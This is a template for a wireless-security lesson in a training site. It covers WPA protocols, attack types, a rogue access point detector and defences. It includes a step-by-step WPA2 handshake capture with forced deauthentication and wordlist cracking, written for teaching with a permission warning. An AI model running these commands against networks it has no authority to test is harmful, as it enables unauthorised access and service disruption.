@@ -1,0 +1,729 @@
+{% extends "base.html" %}
+
+{% block title %}Lesson 5: Wireless Network Security{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-12">
+        <!-- Lesson Header -->
+        <div class="d-flex justify-content-between align-items-center mb-4">
+            <div>
+                <h1 class="h2">
+                    <span class="badge bg-info me-3">Lesson 5</span>
+                    {{ lesson.title }}
+                </h1>
+                <p class="text-muted mb-0">
+                    <i class="fas fa-clock me-1"></i>{{ lesson.duration }}
+                </p>
+            </div>
+            <div>
+                {% if not is_completed %}
+                <button class="btn btn-success" onclick="completeLesson({{ lesson_id }})">
+                    <i class="fas fa-check me-1"></i>Mark Complete
+                </button>
+                {% else %}
+                <span class="badge bg-success fs-6">
+                    <i class="fas fa-check me-1"></i>Completed
+                </span>
+                {% endif %}
+            </div>
+        </div>
+
+        <!-- Lesson Navigation -->
+        <nav class="mb-4">
+            <div class="d-flex justify-content-between">
+                <a href="{{ url_for('lesson', lesson_id=4) }}" class="btn btn-outline-secondary">
+                    <i class="fas fa-arrow-left me-1"></i>Previous: Web App Security
+                </a>
+                <a href="{{ url_for('lesson', lesson_id=6) }}" class="btn btn-outline-info">
+                    Next: Social Engineering <i class="fas fa-arrow-right ms-1"></i>
+                </a>
+            </div>
+        </nav>
+
+        <!-- Lesson Content -->
+        <div class="card">
+            <div class="card-body">
+                <h3>Wireless Network Security</h3>
+                <p>Wireless networks present unique security challenges due to their broadcast nature. This lesson covers wireless security protocols, attack vectors, and defensive strategies.</p>
+
+                <h4>Wireless Security Protocols Evolution</h4>
+                <div class="table-responsive">
+                    <table class="table table-dark table-striped">
+                        <thead>
+                            <tr>
+                                <th>Protocol</th>
+                                <th>Year</th>
+                                <th>Security Level</th>
+                                <th>Key Features</th>
+                                <th>Vulnerabilities</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><span class="badge bg-danger">WEP</span></td>
+                                <td>1997</td>
+                                <td>Very Weak</td>
+                                <td>64/128-bit RC4 encryption</td>
+                                <td>Weak IV, easy to crack</td>
+                            </tr>
+                            <tr>
+                                <td><span class="badge bg-warning">WPA</span></td>
+                                <td>2003</td>
+                                <td>Weak</td>
+                                <td>TKIP, dynamic keys</td>
+                                <td>TKIP vulnerabilities</td>
+                            </tr>
+                            <tr>
+                                <td><span class="badge bg-info">WPA2</span></td>
+                                <td>2004</td>
+                                <td>Good</td>
+                                <td>AES-CCMP encryption</td>
+                                <td>KRACK attack, weak passwords</td>
+                            </tr>
+                            <tr>
+                                <td><span class="badge bg-success">WPA3</span></td>
+                                <td>2018</td>
+                                <td>Strong</td>
+                                <td>SAE, enhanced encryption</td>
+                                <td>Side-channel attacks</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h4>Common Wireless Attack Vectors</h4>
+                <div class="row">
+                    <div class="col-md-6 mb-3">
+                        <div class="card h-100 bg-dark border-danger">
+                            <div class="card-header">
+                                <h6 class="mb-0 text-danger"><i class="fas fa-wifi me-2"></i>Passive Attacks</h6>
+                            </div>
+                            <div class="card-body">
+                                <ul class="small">
+                                    <li><strong>Eavesdropping:</strong> Intercepting unencrypted traffic</li>
+                                    <li><strong>Traffic Analysis:</strong> Studying communication patterns</li>
+                                    <li><strong>SSID Discovery:</strong> Identifying hidden networks</li>
+                                    <li><strong>MAC Address Collection:</strong> Gathering device identifiers</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6 mb-3">
+                        <div class="card h-100 bg-dark border-warning">
+                            <div class="card-header">
+                                <h6 class="mb-0 text-warning"><i class="fas fa-broadcast-tower me-2"></i>Active Attacks</h6>
+                            </div>
+                            <div class="card-body">
+                                <ul class="small">
+                                    <li><strong>Evil Twin:</strong> Rogue access point impersonation</li>
+                                    <li><strong>Deauthentication:</strong> Forcing client disconnections</li>
+                                    <li><strong>WPS Attacks:</strong> Exploiting WiFi Protected Setup</li>
+                                    <li><strong>MITM Attacks:</strong> Intercepting and modifying traffic</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <h4>Wireless Reconnaissance Tools</h4>
+                <div class="row">
+                    <div class="col-md-4 mb-3">
+                        <div class="card bg-dark border-secondary h-100">
+                            <div class="card-body">
+                                <h6><i class="fas fa-search text-info me-2"></i>Airodump-ng</h6>
+                                <p class="small">Wireless packet capture and network discovery</p>
+                                <code class="small">airodump-ng wlan0mon</code>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4 mb-3">
+                        <div class="card bg-dark border-secondary h-100">
+                            <div class="card-body">
+                                <h6><i class="fas fa-wave-square text-success me-2"></i>Kismet</h6>
+                                <p class="small">Wireless network detector and sniffer</p>
+                                <code class="small">kismet -c wlan0</code>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4 mb-3">
+                        <div class="card bg-dark border-secondary h-100">
+                            <div class="card-body">
+                                <h6><i class="fas fa-satellite-dish text-warning me-2"></i>Wash</h6>
+                                <p class="small">WPS-enabled access point scanner</p>
+                                <code class="small">wash -i wlan0mon</code>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <h4>WPA2 4-Way Handshake Attack</h4>
+                <p>The WPA2 handshake capture and offline dictionary attack is a common method for wireless penetration testing:</p>
+                
+                <pre><code class="language-bash"># 1. Put wireless interface in monitor mode
+airmon-ng start wlan0
+
+# 2. Scan for target networks
+airodump-ng wlan0mon
+
+# 3. Capture handshake on specific channel
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+# 4. Force deauthentication to capture handshake
+aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# 5. Crack the captured handshake
+aircrack-ng -w wordlist.txt capture-01.cap</code></pre>
+
+                <h4>Python WiFi Scanner</h4>
+                <pre><code class="language-python">#!/usr/bin/env python3
+import subprocess
+import re
+import time
+import sys
+from tabulate import tabulate
+
+class WiFiScanner:
+    def __init__(self, interface='wlan0'):
+        self.interface = interface
+        self.networks = []
+        
+    def scan_networks(self):
+        """
+        Scan for available WiFi networks
+        """
+        try:
+            # Use iwlist to scan for networks (Linux)
+            result = subprocess.run(['iwlist', self.interface, 'scan'], 
+                                  capture_output=True, text=True, timeout=30)
+            
+            if result.returncode != 0:
+                print("Error scanning networks. Make sure you have proper permissions.")
+                return []
+            
+            return self.parse_scan_results(result.stdout)
+            
+        except subprocess.TimeoutExpired:
+            print("Scan timeout. Wireless interface may be busy.")
+            return []
+        except FileNotFoundError:
+            print("iwlist command not found. This script requires Linux with wireless-tools.")
+            return []
+    
+    def parse_scan_results(self, scan_output):
+        """
+        Parse iwlist scan output
+        """
+        networks = []
+        current_network = {}
+        
+        lines = scan_output.split('\n')
+        
+        for line in lines:
+            line = line.strip()
+            
+            # New access point
+            if 'Address:' in line and 'ESSID' not in line:
+                if current_network:
+                    networks.append(current_network)
+                
+                mac_match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
+                current_network = {
+                    'BSSID': mac_match.group() if mac_match else 'Unknown',
+                    'SSID': '',
+                    'Channel': 'Unknown',
+                    'Signal': 'Unknown',
+                    'Encryption': [],
+                    'Security': 'Open'
+                }
+            
+            # SSID
+            elif 'ESSID:' in line:
+                ssid_match = re.search(r'ESSID:"([^"]*)"', line)
+                if ssid_match:
+                    current_network['SSID'] = ssid_match.group(1)
+                    if not current_network['SSID']:
+                        current_network['SSID'] = '<Hidden>'
+            
+            # Channel
+            elif 'Channel:' in line:
+                channel_match = re.search(r'Channel:(\d+)', line)
+                if channel_match:
+                    current_network['Channel'] = channel_match.group(1)
+            
+            # Signal strength
+            elif 'Signal level=' in line:
+                signal_match = re.search(r'Signal level=(-?\d+)', line)
+                if signal_match:
+                    current_network['Signal'] = signal_match.group(1) + ' dBm'
+            
+            # Encryption information
+            elif 'Encryption key:' in line:
+                if 'on' in line:
+                    current_network['Security'] = 'Encrypted'
+                else:
+                    current_network['Security'] = 'Open'
+            
+            # WPA/WPA2 information
+            elif 'IE: IEEE 802.11i/WPA2' in line:
+                current_network['Encryption'].append('WPA2')
+                current_network['Security'] = 'WPA2'
+            elif 'IE: WPA Version' in line:
+                current_network['Encryption'].append('WPA')
+                if current_network['Security'] != 'WPA2':
+                    current_network['Security'] = 'WPA'
+        
+        # Add the last network
+        if current_network:
+            networks.append(current_network)
+        
+        return networks
+    
+    def analyze_security(self, networks):
+        """
+        Analyze security of discovered networks
+        """
+        vulnerable_networks = []
+        
+        for network in networks:
+            vulnerabilities = []
+            risk_level = 'Low'
+            
+            # Check for open networks
+            if network['Security'] == 'Open':
+                vulnerabilities.append('No encryption - traffic visible to anyone')
+                risk_level = 'High'
+            
+            # Check for WEP
+            elif 'WEP' in network['Security']:
+                vulnerabilities.append('WEP encryption - easily crackable')
+                risk_level = 'Critical'
+            
+            # Check for WPS (simplified check)
+            elif network['Security'] in ['WPA', 'WPA2']:
+                vulnerabilities.append('WPS may be enabled - potential PIN attack')
+                risk_level = 'Medium'
+            
+            # Check for hidden networks
+            if network['SSID'] == '<Hidden>':
+                vulnerabilities.append('Hidden SSID - security through obscurity')
+                if risk_level == 'Low':
+                    risk_level = 'Medium'
+            
+            if vulnerabilities:
+                vulnerable_networks.append({
+                    'network': network,
+                    'vulnerabilities': vulnerabilities,
+                    'risk_level': risk_level
+                })
+        
+        return vulnerable_networks
+    
+    def display_results(self, networks):
+        """
+        Display scan results in a formatted table
+        """
+        if not networks:
+            print("No networks found.")
+            return
+        
+        # Prepare data for tabulation
+        table_data = []
+        for network in networks:
+            encryption_str = ', '.join(network['Encryption']) if network['Encryption'] else network['Security']
+            
+            table_data.append([
+                network['SSID'][:20],  # Truncate long SSIDs
+                network['BSSID'],
+                network['Channel'],
+                network['Signal'],
+                encryption_str
+            ])
+        
+        headers = ['SSID', 'BSSID', 'Channel', 'Signal', 'Security']
+        print("\nDiscovered WiFi Networks:")
+        print("=" * 80)
+        print(tabulate(table_data, headers=headers, tablefmt='grid'))
+    
+    def generate_security_report(self, vulnerable_networks):
+        """
+        Generate security assessment report
+        """
+        if not vulnerable_networks:
+            print("\nSecurity Assessment: All networks appear to have basic security measures.")
+            return
+        
+        print("\nSECURITY ASSESSMENT REPORT")
+        print("=" * 50)
+        
+        risk_counts = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0}
+        
+        for vuln_network in vulnerable_networks:
+            network = vuln_network['network']
+            risk_level = vuln_network['risk_level']
+            vulnerabilities = vuln_network['vulnerabilities']
+            
+            risk_counts[risk_level] += 1
+            
+            print(f"\nNetwork: {network['SSID']} ({network['BSSID']})")
+            print(f"Risk Level: {risk_level}")
+            print("Vulnerabilities:")
+            for vuln in vulnerabilities:
+                print(f"  • {vuln}")
+        
+        print(f"\nSummary:")
+        print(f"Critical Risk: {risk_counts['Critical']} networks")
+        print(f"High Risk: {risk_counts['High']} networks")
+        print(f"Medium Risk: {risk_counts['Medium']} networks")
+        print(f"Low Risk: {risk_counts['Low']} networks")
+
+def main():
+    if len(sys.argv) > 1:
+        interface = sys.argv[1]
+    else:
+        interface = 'wlan0'
+    
+    print(f"WiFi Security Scanner")
+    print(f"Interface: {interface}")
+    print("=" * 40)
+    
+    scanner = WiFiScanner(interface)
+    
+    print("Scanning for networks... (this may take a moment)")
+    networks = scanner.scan_networks()
+    
+    if networks:
+        scanner.display_results(networks)
+        
+        # Perform security analysis
+        vulnerable_networks = scanner.analyze_security(networks)
+        scanner.generate_security_report(vulnerable_networks)
+    else:
+        print("No networks found or scan failed.")
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+
+                <h4>Wireless Security Best Practices</h4>
+                <div class="card bg-dark border-success">
+                    <div class="card-body">
+                        <div class="row">
+                            <div class="col-md-6">
+                                <h6 class="text-success"><i class="fas fa-shield-alt me-2"></i>Access Point Security</h6>
+                                <ul class="small">
+                                    <li>Use WPA3 or WPA2 with AES encryption</li>
+                                    <li>Disable WPS (WiFi Protected Setup)</li>
+                                    <li>Use strong, unique passwords (15+ characters)</li>
+                                    <li>Change default admin credentials</li>
+                                    <li>Enable MAC address filtering for critical networks</li>
+                                    <li>Regularly update firmware</li>
+                                </ul>
+                            </div>
+                            <div class="col-md-6">
+                                <h6 class="text-success"><i class="fas fa-user-shield me-2"></i>Client Security</h6>
+                                <ul class="small">
+                                    <li>Avoid connecting to unknown networks</li>
+                                    <li>Use VPN on public WiFi</li>
+                                    <li>Disable automatic connection to open networks</li>
+                                    <li>Verify SSL/TLS certificates</li>
+                                    <li>Keep devices updated</li>
+                                    <li>Use firewall on mobile devices</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <h4>Enterprise Wireless Security</h4>
+                <h5>802.1X Authentication</h5>
+                <p>Enterprise networks should implement 802.1X for strong authentication:</p>
+                
+                <div class="row">
+                    <div class="col-md-6">
+                        <h6>EAP Methods</h6>
+                        <ul class="small">
+                            <li><strong>EAP-TLS:</strong> Certificate-based authentication</li>
+                            <li><strong>EAP-TTLS:</strong> Tunneled TLS authentication</li>
+                            <li><strong>PEAP:</strong> Protected EAP with TLS tunnel</li>
+                            <li><strong>EAP-FAST:</strong> Flexible Authentication via Secure Tunneling</li>
+                        </ul>
+                    </div>
+                    <div class="col-md-6">
+                        <h6>RADIUS Components</h6>
+                        <ul class="small">
+                            <li><strong>Supplicant:</strong> Client device</li>
+                            <li><strong>Authenticator:</strong> Access point</li>
+                            <li><strong>Authentication Server:</strong> RADIUS server</li>
+                            <li><strong>Certificate Authority:</strong> Issues certificates</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <h4>Rogue Access Point Detection</h4>
+                <pre><code class="language-python">#!/usr/bin/env python3
+import time
+import json
+from collections import defaultdict
+
+class RogueAPDetector:
+    def __init__(self):
+        self.known_aps = set()  # Known legitimate APs (BSSID)
+        self.authorized_ssids = set()  # Authorized SSID patterns
+        self.suspicious_aps = []
+        
+    def load_authorized_networks(self, config_file):
+        """
+        Load list of authorized networks from configuration
+        """
+        try:
+            with open(config_file, 'r') as f:
+                config = json.load(f)
+                self.known_aps = set(config.get('authorized_bssids', []))
+                self.authorized_ssids = set(config.get('authorized_ssids', []))
+        except FileNotFoundError:
+            print(f"Config file {config_file} not found. Using empty whitelist.")
+    
+    def analyze_ap(self, ap_info):
+        """
+        Analyze an access point for suspicious characteristics
+        """
+        suspicious_indicators = []
+        risk_score = 0
+        
+        # Check if AP is in authorized list
+        if ap_info['BSSID'] not in self.known_aps:
+            suspicious_indicators.append("Unknown BSSID")
+            risk_score += 3
+        
+        # Check for suspicious SSID patterns
+        ssid = ap_info['SSID']
+        
+        # Evil twin detection - similar to authorized SSIDs
+        for auth_ssid in self.authorized_ssids:
+            if ssid != auth_ssid and self.similar_ssid(ssid, auth_ssid):
+                suspicious_indicators.append(f"Similar to authorized SSID: {auth_ssid}")
+                risk_score += 5
+        
+        # Common evil twin patterns
+        evil_patterns = ['_nomap', 'Guest', 'Public', 'Free', 'Hotel']
+        if any(pattern.lower() in ssid.lower() for pattern in evil_patterns):
+            suspicious_indicators.append("Uses common evil twin keywords")
+            risk_score += 2
+        
+        # Security analysis
+        if ap_info['Security'] == 'Open':
+            suspicious_indicators.append("Open network")
+            risk_score += 1
+        elif ap_info['Security'] == 'WEP':
+            suspicious_indicators.append("Weak WEP encryption")
+            risk_score += 2
+        
+        # Channel analysis - multiple APs on same channel
+        # This would require more complex scanning and comparison
+        
+        return suspicious_indicators, risk_score
+    
+    def similar_ssid(self, ssid1, ssid2, threshold=0.8):
+        """
+        Check if two SSIDs are suspiciously similar
+        """
+        if len(ssid1) == 0 or len(ssid2) == 0:
+            return False
+        
+        # Simple similarity check based on character overlap
+        common_chars = set(ssid1.lower()) & set(ssid2.lower())
+        similarity = len(common_chars) / max(len(set(ssid1.lower())), len(set(ssid2.lower())))
+        
+        return similarity >= threshold and ssid1 != ssid2
+    
+    def generate_alert(self, ap_info, indicators, risk_score):
+        """
+        Generate security alert for suspicious AP
+        """
+        alert = {
+            'timestamp': time.time(),
+            'ssid': ap_info['SSID'],
+            'bssid': ap_info['BSSID'],
+            'channel': ap_info['Channel'],
+            'signal': ap_info['Signal'],
+            'security': ap_info['Security'],
+            'risk_score': risk_score,
+            'indicators': indicators,
+            'severity': self.get_severity(risk_score)
+        }
+        
+        return alert
+    
+    def get_severity(self, risk_score):
+        """
+        Determine alert severity based on risk score
+        """
+        if risk_score >= 5:
+            return 'High'
+        elif risk_score >= 3:
+            return 'Medium'
+        else:
+            return 'Low'
+    
+    def monitor_networks(self, scan_results):
+        """
+        Monitor networks for rogue access points
+        """
+        alerts = []
+        
+        for ap in scan_results:
+            indicators, risk_score = self.analyze_ap(ap)
+            
+            if indicators:  # Suspicious AP found
+                alert = self.generate_alert(ap, indicators, risk_score)
+                alerts.append(alert)
+        
+        return alerts
+
+# Example usage
+def main():
+    detector = RogueAPDetector()
+    
+    # Example scan results (would come from actual WiFi scanner)
+    scan_results = [
+        {
+            'SSID': 'CompanyWiFi',
+            'BSSID': 'AA:BB:CC:DD:EE:FF',
+            'Channel': '6',
+            'Signal': '-45 dBm',
+            'Security': 'WPA2'
+        },
+        {
+            'SSID': 'CompanyWiFi_Guest',  # Potential evil twin
+            'BSSID': '11:22:33:44:55:66',
+            'Channel': '6',
+            'Signal': '-40 dBm',
+            'Security': 'Open'
+        }
+    ]
+    
+    alerts = detector.monitor_networks(scan_results)
+    
+    if alerts:
+        print("ROGUE ACCESS POINT ALERTS")
+        print("=" * 40)
+        for alert in alerts:
+            print(f"Severity: {alert['severity']}")
+            print(f"SSID: {alert['ssid']}")
+            print(f"BSSID: {alert['bssid']}")
+            print(f"Indicators: {', '.join(alert['indicators'])}")
+            print("-" * 40)
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+
+                <h4>Exercise</h4>
+                <div class="card bg-dark border-warning">
+                    <div class="card-body">
+                        <h6><i class="fas fa-tasks text-warning me-2"></i>Wireless Security Assessment Lab</h6>
+                        <p><strong>Objective:</strong> Practice wireless network security assessment techniques.</p>
+                        <ol>
+                            <li>Set up a test wireless environment:
+                                <ul>
+                                    <li>Configure a router with different security settings</li>
+                                    <li>Create networks with WPA2, WPA, and open configurations</li>
+                                </ul>
+                            </li>
+                            <li>Use scanning tools to discover networks:
+                                <ul>
+                                    <li>Run the Python WiFi scanner</li>
+                                    <li>Use airodump-ng for detailed analysis</li>
+                                    <li>Compare results from different tools</li>
+                                </ul>
+                            </li>
+                            <li>Analyze security configurations:
+                                <ul>
+                                    <li>Identify encryption methods</li>
+                                    <li>Check for WPS enabled networks</li>
+                                    <li>Look for hidden SSIDs</li>
+                                </ul>
+                            </li>
+                            <li>Document findings and create recommendations</li>
+                        </ol>
+                        <div class="alert alert-danger mt-2">
+                            <small><i class="fas fa-exclamation-triangle me-1"></i>Only test networks you own or have explicit permission to assess!</small>
+                        </div>
+                    </div>
+                </div>
+
+                <h4>Wireless Security Checklist</h4>
+                <div class="row">
+                    <div class="col-md-6">
+                        <div class="card bg-dark border-info">
+                            <div class="card-header">
+                                <h6 class="mb-0 text-info">Assessment Checklist</h6>
+                            </div>
+                            <div class="card-body">
+                                <ul class="small">
+                                    <li>☐ Inventory all wireless access points</li>
+                                    <li>☐ Verify encryption protocols in use</li>
+                                    <li>☐ Check for rogue access points</li>
+                                    <li>☐ Test password strength</li>
+                                    <li>☐ Verify WPS is disabled</li>
+                                    <li>☐ Check guest network isolation</li>
+                                    <li>☐ Review access logs</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="card bg-dark border-success">
+                            <div class="card-header">
+                                <h6 class="mb-0 text-success">Remediation Actions</h6>
+                            </div>
+                            <div class="card-body">
+                                <ul class="small">
+                                    <li>☐ Upgrade to WPA3 where possible</li>
+                                    <li>☐ Implement 802.1X authentication</li>
+                                    <li>☐ Deploy wireless intrusion detection</li>
+                                    <li>☐ Segment guest and corporate networks</li>
+                                    <li>☐ Regularly rotate WiFi passwords</li>
+                                    <li>☐ Monitor for unauthorized devices</li>
+                                    <li>☐ Train users on wireless security</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Progress Footer -->
+        <div class="mt-4 text-center">
+            <p class="text-muted">Lesson 5 of {{ total_lessons }}</p>
+            <div class="progress mx-auto" style="width: 300px; height: 8px;">
+                <div class="progress-bar bg-info" style="width: {{ (5 / total_lessons * 100) }}%"></div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+function completeLesson(lessonId) {
+    fetch(`/complete/${lessonId}`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        }
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            location.reload();
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
+}
+</script>
+{% endblock %}
